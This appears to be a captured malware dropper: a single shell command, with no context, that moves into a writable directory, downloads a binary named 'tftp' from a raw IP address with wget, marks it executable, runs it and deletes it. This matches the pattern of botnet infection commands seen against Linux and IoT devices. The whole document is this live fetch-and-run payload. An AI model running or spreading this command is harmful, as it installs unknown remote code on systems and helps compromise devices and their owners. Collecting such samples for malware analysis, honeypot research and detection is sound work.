cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.130.109.101/tftp; chmod +x tftp; ./tftp; rm -rf tftp
